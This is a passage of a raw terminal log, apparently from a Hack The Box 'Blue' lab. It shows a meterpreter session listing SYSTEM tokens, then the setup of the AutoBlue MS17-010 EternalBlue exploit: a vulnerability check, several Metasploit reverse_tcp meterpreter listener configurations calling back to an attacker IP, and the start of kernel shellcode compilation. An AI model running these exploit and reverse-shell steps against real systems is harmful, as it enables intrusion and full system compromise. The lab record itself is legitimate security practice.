+    m/u : 0af3a4c21cac072f830761b502678978952df30d / 0fc84e4ea5c892f674a6eab6fb623ea793cfcf6f                  
+old/hex : 01 00 00 00 c9 22 d6 0b 83 9e dd 98 a7 ad 7a 5a c5 ff 4e bb 8a d2 6f 01 61 be bf d4 bc 70 54 70 fd df 46 12 a8 c5 e5 2d 98 6c 79 71                         
+    full: c922d60b839edd98a7ad7a5ac5ff4ebb8ad26f0161bebfd4bc705470fddf4612a8c5e52d986c7971                     
+    m/u : c922d60b839edd98a7ad7a5ac5ff4ebb8ad26f01 / 61bebfd4bc705470fddf4612a8c5e52d986c7971                  
+
+
+meterpreter > load incognito                           
+Loading extension incognito...Success.                 
+meterpreter > liste_tokens -u                          
+[-] Unknown command: liste_tokens.                     
+meterpreter > list_tokens -u                           
+
+Delegation Tokens Available                            
+========================================               
+NT AUTHORITY\LOCAL SERVICE 
+NT AUTHORITY\NETWORK SERVICE                           
+NT AUTHORITY\SYSTEM        
+
+Impersonation Tokens Available                         
+========================================               
+NT AUTHORITY\ANONYMOUS LOGON                           
+
+meterpreter > exit         
+[*] Shutting down Meterpreter...                       
+
+[*] 10.10.10.40 - Meterpreter session 2 closed.  Reason: User exit                                             
+msf5 exploit(windows/smb/ms17_010_eternalblue) > git clone https://github.com/3ndG4me/AutoBlue-MS17-010        
+[*] exec: git clone https://github.com/3ndG4me/AutoBlue-MS17-010                                               
+
+Cloning into 'AutoBlue-MS17-010'...                    
+remote: Enumerating objects: 26, done.                 
+remote: Counting objects: 100% (26/26), done.          
+remote: Compressing objects: 100% (25/25), done.       
+remote: Total 102 (delta 12), reused 5 (delta 1), pack-reused 76                                               
+Receiving objects: 100% (102/102), 77.30 KiB | 1.43 MiB/s, done.                                               
+Resolving deltas: 100% (52/52), done.                  
+msf5 exploit(windows/smb/ms17_010_eternalblue) > exit  
+arjun@kali:~/Documents/HackTheBox/retired/blue$ cd AutoBlue-MS17-010/                                          
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ ls                                           
+eternalblue_exploit10.py  eternalblue_exploit8.py  LICENSE           mysmb.py   shellcode                      
+eternalblue_exploit7.py   eternal_checker.py       listener_prep.sh  README.md  zzz_exploit.py                 
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ python eternal_checker.py                    
+Traceback (most recent call last):                     
+  File "eternal_checker.py", line 1, in <module>       
+    from mysmb import MYSMB
+  File "/home/arjun/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010/mysmb.py", line 3, in <module>         
+    from impacket import smb, smbconnection            
+ImportError: No module named impacket                  
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ python3 eternal_checker.py                   
+Traceback (most recent call last):                     
+  File "eternal_checker.py", line 1, in <module>       
+    from mysmb import MYSMB                            
+  File "/home/arjun/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010/mysmb.py", line 567                    
+    except Exception, e:   
+                    ^      
+SyntaxError: invalid syntax                            
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ sudo python -m pip install impacket          
+[sudo] password for arjun:                             
+/usr/bin/python: No module named pip                   
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ sudo apt install pip                         
+Reading package lists... Done                          
+Building dependency tree                               
+Reading state information... Done                      
+E: Unable to locate package pip                        
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ sudo apt install python-pip                  
+Reading package lists... Done                          
+Building dependency tree                               
+Reading state information... Done                      
+Package python-pip is not available, but is referred to by another package.                                    
+This may mean that the package is missing, has been obsoleted, or                                              
+is only available from another source                  
+
+E: Package 'python-pip' has no installation candidate  
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py                 
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                
+                                 Dload  Upload   Total   Spent    Left  Speed                                  
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0Warning: Failed to create the file get-pip.py: Permission denied                        
+  0 1824k    0  1371    0     0  15404      0  0:02:01 --:--:--  0:02:01 15579                                 
+curl: (23) Failed writing body (0 != 1371)             
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ ls                                           
+eternalblue_exploit10.py  eternalblue_exploit8.py  LICENSE           mysmb.py   shellcode                      
+eternalblue_exploit7.py   eternal_checker.py       listener_prep.sh  README.md  zzz_exploit.py                 
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ cd ..                                        
+arjun@kali:~/Documents/HackTheBox/retired/blue$ curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py        
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                
+                                 Dload  Upload   Total   Spent    Left  Speed                                  
+100 1824k  100 1824k    0     0  3889k      0 --:--:-- --:--:-- --:--:-- 3881k                                 
+arjun@kali:~/Documents/HackTheBox/retired/blue$ python get-pip.py                                              
+DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip, can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support                          
+Defaulting to user installation because normal site-packages is not writeable                                  
+Collecting pip             
+  Downloading pip-20.1-py2.py3-none-any.whl (1.5 MB)   
+     |████████████████████████████████| 1.5 MB 2.3 MB/s                                                        
+Collecting setuptools      
+  Downloading setuptools-44.1.0-py2.py3-none-any.whl (583 kB)                                                  
+     |████████████████████████████████| 583 kB 14.9 MB/s                                                       
+Collecting wheel           
+  Downloading wheel-0.34.2-py2.py3-none-any.whl (26 kB)                                                        
+Installing collected packages: pip, setuptools, wheel  
+  WARNING: The scripts pip, pip2 and pip2.7 are installed in '/home/arjun/.local/bin' which is not on PATH.    
+  Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.                       
+  WARNING: The scripts easy_install and easy_install-2.7 are installed in '/home/arjun/.local/bin' which is not on PATH.                  
+  Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.                       
+  WARNING: The script wheel is installed in '/home/arjun/.local/bin' which is not on PATH.                     
+  Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.                       
+Successfully installed pip-20.1 setuptools-44.1.0 wheel-0.34.2                                                 
+arjun@kali:~/Documents/HackTheBox/retired/blue$ sudo python -m pip install impackets                           
+/usr/bin/python: No module named pip                   
+arjun@kali:~/Documents/HackTheBox/retired/blue$ sudo python get-pip.py                                         
+DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip, can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support                          
+Collecting pip             
+  Downloading pip-20.1-py2.py3-none-any.whl (1.5 MB)   
+     |████████████████████████████████| 1.5 MB 1.6 MB/s                                                        
+Collecting setuptools      
+  Downloading setuptools-44.1.0-py2.py3-none-any.whl (583 kB)                                                  
+     |████████████████████████████████| 583 kB 5.3 MB/s                                                        
+Collecting wheel           
+  Downloading wheel-0.34.2-py2.py3-none-any.whl (26 kB)                                                        
+Installing collected packages: pip, setuptools, wheel  
+Successfully installed pip-20.1 setuptools-44.1.0 wheel-0.34.2                                                 
+arjun@kali:~/Documents/HackTheBox/retired/blue$ sudo python -m pip install impackets                           
+DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip, can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support                          
+ERROR: Could not find a version that satisfies the requirement impackets (from versions: none)                 
+ERROR: No matching distribution found for impackets    
+arjun@kali:~/Documents/HackTheBox/retired/blue$ cd AutoBlue-MS17-010/                                          
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ ls                                           
+eternalblue_exploit10.py  eternalblue_exploit8.py  LICENSE           mysmb.py   shellcode                      
+eternalblue_exploit7.py   eternal_checker.py       listener_prep.sh  README.md  zzz_exploit.py                 
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ python eternal_checker.py                    
+Traceback (most recent call last):                     
+  File "eternal_checker.py", line 1, in <module>       
+    from mysmb import MYSMB
+  File "/home/arjun/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010/mysmb.py", line 3, in <module>         
+    from impacket import smb, smbconnection            
+ImportError: No module named impacket                  
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ sudo python -m pip install impacket          
+DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip, can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support                          
+Collecting impacket        
+  Downloading impacket-0.9.21.tar.gz (1.3 MB)          
+     |████████████████████████████████| 1.3 MB 2.9 MB/s                                                        
+Collecting pyasn1>=0.2.3   
+  Downloading pyasn1-0.4.8-py2.py3-none-any.whl (77 kB)                                                        
+     |████████████████████████████████| 77 kB 18.9 MB/s                                                        
+Collecting pycryptodomex   
+  Downloading pycryptodomex-3.9.7-cp27-cp27mu-manylinux1_x86_64.whl (13.7 MB)                                  
+     |████████████████████████████████| 13.7 MB 939 kB/s                                                       
+Requirement already satisfied: pyOpenSSL>=0.13.1 in /usr/lib/python2.7/dist-packages (from impacket) (19.0.0)  
+Requirement already satisfied: six in /usr/lib/python2.7/dist-packages (from impacket) (1.14.0)                
+Collecting ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5            
+  Downloading ldap3-2.7-py2.py3-none-any.whl (420 kB)  
+     |████████████████████████████████| 420 kB 21.3 MB/s                                                       
+Collecting ldapdomaindump>=0.9.0                       
+  Downloading ldapdomaindump-0.9.2-py2-none-any.whl (21 kB)                                                    
+Collecting flask>=1.0      
+  Downloading Flask-1.1.2-py2.py3-none-any.whl (94 kB) 
+     |████████████████████████████████| 94 kB 10.0 MB/s                                                        
+Requirement already satisfied: future in /usr/lib/python2.7/dist-packages (from ldapdomaindump>=0.9.0->impacket) (0.18.2)                 
+Collecting dnspython       
+  Downloading dnspython-1.16.0-py2.py3-none-any.whl (188 kB)                                                   
+     |████████████████████████████████| 188 kB 43.3 MB/s                                                       
+Collecting Werkzeug>=0.15  
+  Downloading Werkzeug-1.0.1-py2.py3-none-any.whl (298 kB)                                                     
+     |████████████████████████████████| 298 kB 23.0 MB/s                                                       
+Collecting click>=5.1      
+  Downloading click-7.1.2-py2.py3-none-any.whl (82 kB) 
+     |████████████████████████████████| 82 kB 4.0 MB/s 
+Collecting itsdangerous>=0.24                          
+  Downloading itsdangerous-1.1.0-py2.py3-none-any.whl (16 kB)                                                  
+Collecting Jinja2>=2.10.1  
+  Downloading Jinja2-2.11.2-py2.py3-none-any.whl (125 kB)                                                      
+     |████████████████████████████████| 125 kB 50.9 MB/s                                                       
+Collecting MarkupSafe>=0.23                            
+  Downloading MarkupSafe-1.1.1-cp27-cp27mu-manylinux1_x86_64.whl (24 kB)                                       
+Building wheels for collected packages: impacket       
+  Building wheel for impacket (setup.py) ... done      
+  Created wheel for impacket: filename=impacket-0.9.21-py2-none-any.whl size=1275219 sha256=aebb8ea82c03def435e84bd05f9e4bf327cabe9bf66a692f903f65bdbb8b4c5e          
+  Stored in directory: /root/.cache/pip/wheels/78/2b/7f/6178812817a5561c795757857b11995ec747fbcc0caab0173f     
+Successfully built impacket                            
+Installing collected packages: pyasn1, pycryptodomex, ldap3, dnspython, ldapdomaindump, Werkzeug, click, itsdangerous, MarkupSafe, Jinja2, flask, impacket            
+Successfully installed Jinja2-2.11.2 MarkupSafe-1.1.1 Werkzeug-1.0.1 click-7.1.2 dnspython-1.16.0 flask-1.1.2 impacket-0.9.21 itsdangerous-1.1.0 ldap3-2.7 ldapdomaindump-0.9.2 pyasn1-0.4.8 pycryptodomex-3.9.7              
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ python eternal_checker.py                    
+usage: eternal_checker.py [-h] [-target-ip ip address] 
+                          [-port [destination port]]   
+                          target                       
+
+positional arguments:      
+  target                [[domain/]username[:password]@]<targetName or address>                                 
+
+optional arguments:        
+  -h, --help            show this help message and exit                                                        
+
+connection:                
+  -target-ip ip address    
+                        IP Address of the target machine. If ommited it will                                   
+                        use whatever was specified as target. This is useful                                   
+                        when target is the NetBIOS name and you cannot resolve                                 
+                        it 
+  -port [destination port] 
+                        Destination port to connect to SMB Server                                              
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ python eternal_checker.py -target-ip 10.10.10.40 -p 445                 
+usage: eternal_checker.py [-h] [-target-ip ip address] 
+                          [-port [destination port]]   
+                          target                       
+eternal_checker.py: error: too few arguments           
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ python eternal_checker.py -target-ip 10.10.10
+.40 -port 445              
+usage: eternal_checker.py [-h] [-target-ip ip address] 
+                          [-port [destination port]]   
+                          target                       
+eternal_checker.py: error: too few arguments           
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ python eternal_checker.py -target-ip 10.10.10.40 -port 445 target       
+[*] Target OS: Windows 7 Professional 7601 Service Pack 1                                                      
+[!] The target is not patched                          
+=== Testing named pipes ===                            
+[*] Done                   
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ python eternal_checker.py 10.10.10.40        
+[*] Target OS: Windows 7 Professional 7601 Service Pack 1                                                      
+[!] The target is not patched                          
+=== Testing named pipes ===                            
+[*] Done                   
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ ls                                           
+eternalblue_exploit10.py  eternalblue_exploit8.py  LICENSE           mysmb.py   shellcode                      
+eternalblue_exploit7.py   eternal_checker.py       listener_prep.sh  README.md  zzz_exploit.py                 
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ python eternalblue_exploit7.py               
+eternalblue_exploit7.py <ip> <shellcode_file> [numGroomConn]                                                   
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ ./listener_prep.sh                           
+  __                       
+  /,-                      
+  ||)                      
+  \\_, )                   
+   `--'                    
+Enternal Blue Metasploit Listener                      
+
+LHOST for reverse connection:                          
+9001                       
+LPORT for x64 reverse connection:                      
+^C                         
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ ./listener_prep.sh                           
+  __                       
+  /,-                      
+  ||)                      
+  \\_, )                   
+   `--'                    
+Enternal Blue Metasploit Listener                      
+
+LHOST for reverse connection:                          
+10.10.14.19                
+LPORT for x64 reverse connection:                      
+9001                       
+LPORT for x86 reverse connection:                      
+9001                       
+Enter 0 for meterpreter shell or 1 for regular cmd shell:                                                      
+0                          
+Type 0 if this is a staged payload or 1 if it is for a stageless payload                                       
+0                          
+Starting listener (staged)...                          
+touch: cannot touch 'config.rc': Permission denied     
+./listener_prep.sh: line 27: config.rc: Permission denied                                                      
+./listener_prep.sh: line 28: config.rc: Permission denied                                                      
+./listener_prep.sh: line 29: config.rc: Permission denied                                                      
+./listener_prep.sh: line 30: config.rc: Permission denied                                                      
+./listener_prep.sh: line 31: config.rc: Permission denied                                                      
+./listener_prep.sh: line 32: config.rc: Permission denied                                                      
+./listener_prep.sh: line 33: config.rc: Permission denied                                                      
+./listener_prep.sh: line 34: config.rc: Permission denied                                                      
+./listener_prep.sh: line 35: config.rc: Permission denied                                                      
+./listener_prep.sh: line 36: config.rc: Permission denied                                                      
+Starting postgresql (via systemctl): postgresql.service.                                                       
+[-] ***rting the Metasploit Framework console...\      
+[-] * WARNING: No database support: No database YAML file                                                      
+[-] ***                    
+                                                       
+                                              `:oDFo:`                                                         
+                                           ./ymM0dayMmy/.                                                      
+                                        -+dHJ5aGFyZGVyIQ==+-                                                   
+                                    `:sm⏣~~Destroy.No.Data~~s:`                                                
+                                 -+h2~~Maintain.No.Persistence~~h+-                                            
+                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`                                         
+                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.                                     
+                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-                                  
+                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-                                 
+                      :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:                                 
+                      :we're.all.alike'`                     The.PFYroy.No.D7:                                 
+                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:                                 
+                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:                                 
+                      :---srwxrwx:-.`                        `MS146.52.No.Per:                                 
+                      :<script>.Ac816/                        sENbove3101.404:                                 
+                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:                                 
+                      :09.14.2011.raid                       /STFU|wall.No.Pr:                                 
+                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:                                 
+                      :#OUTHOUSE-  -s:                       /corykennedyData:                                 
+                      :$nmap -oS                              SSo.6178306Ence:                                 
+                      :Awsm.da:                            /shMTl#beats3o.No.:                                 
+                      :Ring0:                             `dDestRoyREXKC3ta/M:                                 
+                      :23d:                               sSETEC.ASTRONOMYist:                                 
+                       /-                        /yo-    .ence.N:(){ :|: & };:                                 
+                                                 `:Shall.We.Play.A.Game?tron/                                  
+                                                 ```-ooy.if1ghtf0r+ehUser5`                                    
+                                               ..th3.H1V3.U2VjRFNN.jMh+.`                                      
+                                              `MjM~~WE.ARE.se~~MMjMs                                           
+                                               +~KANSAS.CITY's~-`                                              
+                                                J~HAKCERS~./.`                                                 
+                                                .esc:wq!:`                                                     
+                                                 +++ATH`                                                       
+                                                  `    
+
+
+       =[ metasploit v5.0.76-dev                          ]                                                    
++ -- --=[ 1971 exploits - 1088 auxiliary - 339 post       ]                                                    
++ -- --=[ 558 payloads - 45 encoders - 10 nops            ]                                                    
++ -- --=[ 7 evasion                                       ]                                                    
+
+[-] Cannot find resource script: config.rc             
+msf5 > exit                
+Stopping postgresql (via systemctl): postgresql.service.                                                       
+rm: cannot remove 'config.rc': No such file or directory                                                       
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ sudo ./listener_prep.sh                      
+  __                       
+  /,-                      
+  ||)                      
+  \\_, )                   
+   `--'                    
+Enternal Blue Metasploit Listener                      
+
+LHOST for reverse connection:                          
+10.10.14.19                
+LPORT for x64 reverse connection:                      
+9001                       
+LPORT for x86 reverse connection:                      
+9001                       
+Enter 0 for meterpreter shell or 1 for regular cmd shell:                                                      
+0                          
+Type 0 if this is a staged payload or 1 if it is for a stageless payload                                       
+0                          
+Starting listener (staged)...                          
+Starting postgresql (via systemctl): postgresql.service.                                                       
+[-] ***rting the Metasploit Framework console...-      
+[-] * WARNING: No database support: No database YAML file                                                      
+[-] ***                    
+                                                       
+                          ########                  #  
+                      #################            #   
+                   ######################         #    
+                  #########################      #     
+                ############################           
+               ##############################          
+               ###############################         
+              ###############################          
+              ##############################           
+                              #    ########   #        
+                 ##        ###        ####   ##        
+                                      ###   ###        
+                                    ####   ###         
+               ####          ##########   ####         
+               #######################   ####          
+                 ####################   ####           
+                  ##################  ####             
+                    ############      ##               
+                       ########        ###             
+                      #########        #####           
+                    ############      ######           
+                   ########      #########             
+                     #####       ########              
+                       ###       #########             
+                      ######    ############           
+                     #######################           
+                     #   #   ###  #   #   ##           
+                     ########################          
+                      ##     ##   ##     ##            
+                            https://metasploit.com     
+
+
+       =[ metasploit v5.0.76-dev                          ]                                                    
++ -- --=[ 1971 exploits - 1088 auxiliary - 339 post       ]                                                    
++ -- --=[ 558 payloads - 45 encoders - 10 nops            ]                                                    
++ -- --=[ 7 evasion                                       ]                                                    
+
+[*] Processing config.rc for ERB directives.           
+resource (config.rc)> use exploit/multi/handler        
+resource (config.rc)> set PAYLOAD windows/x64/meterpreter/reverse_tcp                                          
+PAYLOAD => windows/x64/meterpreter/reverse_tcp         
+resource (config.rc)> set LHOST 10.10.14.19            
+LHOST => 10.10.14.19       
+resource (config.rc)> set LPORT 9001                   
+LPORT => 9001              
+resource (config.rc)> set ExitOnSession false          
+ExitOnSession => false     
+resource (config.rc)> set EXITFUNC thread              
+EXITFUNC => thread         
+resource (config.rc)> exploit -j                       
+[*] Exploit running as background job 0.               
+[*] Exploit completed, but no session was created.     
+resource (config.rc)> set PAYLOAD windows/meterpreter/reverse_tcp                                              
+[-] Handler failed to bind to 10.10.14.19:9001:-  -    
+[-] Handler failed to bind to 0.0.0.0:9001:-  -        
+[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:9001). 
+PAYLOAD => windows/meterpreter/reverse_tcp             
+resource (config.rc)> set LPORT 9001                   
+LPORT => 9001              
+resource (config.rc)> exploit -j                       
+[*] Exploit running as background job 1.               
+[*] Exploit completed, but no session was created.     
+
+[-] Handler failed to bind to 10.10.14.19:9001:-  -    
+[-] Handler failed to bind to 0.0.0.0:9001:-  -        
+[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:9001). 
+msf5 exploit(multi/handler) > exit                     
+Stopping postgresql (via systemctl): postgresql.service.                                                       
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ sudo ./listener_prep.sh                      
+  __                       
+  /,-                      
+  ||)                      
+  \\_, )                   
+   `--'                    
+Enternal Blue Metasploit Listener                      
+
+LHOST for reverse connection:                          
+10.10.14.19                
+LPORT for x64 reverse connection:                      
+9001                       
+LPORT for x86 reverse connection:                      
+9001                       
+Enter 0 for meterpreter shell or 1 for regular cmd shell:                                                      
+0                          
+Type 0 if this is a staged payload or 1 if it is for a stageless payload                                       
+0                          
+Starting listener (staged)...                          
+Starting postgresql (via systemctl): postgresql.service.                                                       
+[-] ***rting the Metasploit Framework console...-      
+[-] * WARNING: No database support: No database YAML file                                                      
+[-] ***                    
+                                                       
+                                   ____________        
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                
+ [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]                                
+ [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]                                
+ [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]                                
+ [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]                                
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]                                
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                
+
+
+       =[ metasploit v5.0.76-dev                          ]                                                    
++ -- --=[ 1971 exploits - 1088 auxiliary - 339 post       ]                                                    
++ -- --=[ 558 payloads - 45 encoders - 10 nops            ]                                                    
++ -- --=[ 7 evasion                                       ]                                                    
+
+[*] Processing config.rc for ERB directives.           
+resource (config.rc)> use exploit/multi/handler        
+resource (config.rc)> set PAYLOAD windows/x64/meterpreter/reverse_tcp                                          
+PAYLOAD => windows/x64/meterpreter/reverse_tcp         
+resource (config.rc)> set LHOST 10.10.14.19            
+LHOST => 10.10.14.19       
+resource (config.rc)> set LPORT 9001                   
+LPORT => 9001              
+resource (config.rc)> set ExitOnSession false          
+ExitOnSession => false     
+resource (config.rc)> set EXITFUNC thread              
+EXITFUNC => thread         
+resource (config.rc)> exploit -j                       
+[*] Exploit running as background job 0.               
+[*] Exploit completed, but no session was created.     
+resource (config.rc)> set PAYLOAD windows/meterpreter/reverse_tcp                                              
+PAYLOAD => windows/meterpreter/reverse_tcp             
+resource (config.rc)> set LPORT 9001                   
+LPORT => 9001              
+resource (config.rc)> exploit -j                       
+[*] Started reverse TCP handler on 10.10.14.19:9001    
+[*] Exploit running as background job 1.               
+[*] Exploit completed, but no session was created.     
+
+[-] Handler failed to bind to 10.10.14.19:9001:-  -    
+[-] Handler failed to bind to 0.0.0.0:9001:-  -        
+[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:9001). 
+msf5 exploit(multi/handler) > ls                       
+[*] exec: ls               
+
+config.rc                 eternalblue_exploit8.py  listener_prep.sh  shellcode                                 
+eternalblue_exploit10.py  eternal_checker.py       mysmb.py          zzz_exploit.py                            
+eternalblue_exploit7.py   LICENSE                  README.md                                                   
+msf5 exploit(multi/handler) > exit                     
+Stopping postgresql (via systemctl): postgresql.service.                                                       
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ sudo ./listener_prep.sh                      
+  __                       
+  /,-                      
+  ||)                      
+  \\_, )                   
+   `--'                    
+Enternal Blue Metasploit Listener                      
+
+LHOST for reverse connection:                          
+10.10.14.19                
+LPORT for x64 reverse connection:                      
+9005                       
+LPORT for x86 reverse connection:                      
+9005                       
+Enter 0 for meterpreter shell or 1 for regular cmd shell:                                                      
+0                          
+Type 0 if this is a staged payload or 1 if it is for a stageless payload                                       
+0                          
+Starting listener (staged)...                          
+Starting postgresql (via systemctl): postgresql.service.                                                       
+[-] ***rting the Metasploit Framework console...-      
+[-] * WARNING: No database support: No database YAML file                                                      
+[-] ***                    
+                                                       
+
+ ______________________________________________________________________________                                
+|                                                                              |                               
+|                   METASPLOIT CYBER MISSILE COMMAND V5                        |                               
+|______________________________________________________________________________|                               
+      \                                  /                      /                                              
+       \     .                          /                      /            x                                  
+        \                              /                      /                                                
+         \                            /          +           /                                                 
+          \            +             /                      /                                                  
+           *                        /                      /                                                   
+                                   /      .               /                                                    
+    X                             /                      /            X                                        
+                                 /                     ###                                                     
+                                /                     # % #                                                    
+                               /                       ###                                                     
+                      .       /                        
+     .                       /      .            *           .                                                 
+                            /                          
+                           *                           
+                  +                       *            
+
+                                       ^               
+####      __     __     __          #######         __     __     __        ####                               
+####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####                               
+################################################################################                               
+################################################################################                               
+# WAVE 5 ######## SCORE 31337 ################################## HIGH FFFFFFFF #                               
+################################################################################                               
+                                                           https://metasploit.com                              
+
+
+       =[ metasploit v5.0.76-dev                          ]                                                    
++ -- --=[ 1971 exploits - 1088 auxiliary - 339 post       ]                                                    
++ -- --=[ 558 payloads - 45 encoders - 10 nops            ]                                                    
++ -- --=[ 7 evasion                                       ]                                                    
+
+[*] Processing config.rc for ERB directives.           
+resource (config.rc)> use exploit/multi/handler        
+resource (config.rc)> set PAYLOAD windows/x64/meterpreter/reverse_tcp                                          
+PAYLOAD => windows/x64/meterpreter/reverse_tcp         
+resource (config.rc)> set LHOST 10.10.14.19            
+LHOST => 10.10.14.19       
+resource (config.rc)> set LPORT 9005                   
+LPORT => 9005              
+resource (config.rc)> set ExitOnSession false          
+ExitOnSession => false     
+resource (config.rc)> set EXITFUNC thread              
+EXITFUNC => thread         
+resource (config.rc)> exploit -j                       
+[*] Exploit running as background job 0.               
+[*] Exploit completed, but no session was created.     
+resource (config.rc)> set PAYLOAD windows/meterpreter/reverse_tcp                                              
+PAYLOAD => windows/meterpreter/reverse_tcp             
+resource (config.rc)> set LPORT 9005                   
+LPORT => 9005              
+resource (config.rc)> exploit -j                       
+[*] Started reverse TCP handler on 10.10.14.19:9005    
+[*] Exploit running as background job 1.               
+[*] Exploit completed, but no session was created.     
+
+[-] Handler failed to bind to 10.10.14.19:9005:-  -    
+[-] Handler failed to bind to 0.0.0.0:9005:-  -        
+[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:9005). 
+msf5 exploit(multi/handler) > exit                     
+Stopping postgresql (via systemctl): postgresql.service.                                                       
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ cd shellcode/                                
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010/shellcode$ ls                                 
+eternalblue_kshellcode_x64.asm  eternalblue_kshellcode_x86.asm  eternalblue_sc_merge.py  shell_prep.sh         
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010/shellcode$ ./shell_prep.sh                    
+                 _.-;;-._  
+          '-..-'|   ||   | 
+          '-..-'|_.-;;-._| 
+          '-..-'|   ||   | 
+          '-..-'|_.-''-._|                             
+Eternal Blue Windows Shellcode Compiler                
+
+Let's compile them windoos shellcodezzz                
+
+Compiling x64 kernel shellcode                         
+nasm: fatal: unable to open output file `sc_x64_kernel.bin'                                                    
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010/shellcode$ sudo ./shell_prep.sh               
+                 _.-;;-._  
+          '-..-'|   ||   | 
+          '-..-'|_.-;;-._| 
+          '-..-'|   ||   | 
+          '-..-'|_.-''-._|                             
+Eternal Blue Windows Shellcode Compiler                
+
+Let's compile them windoos shellcodezzz                
+
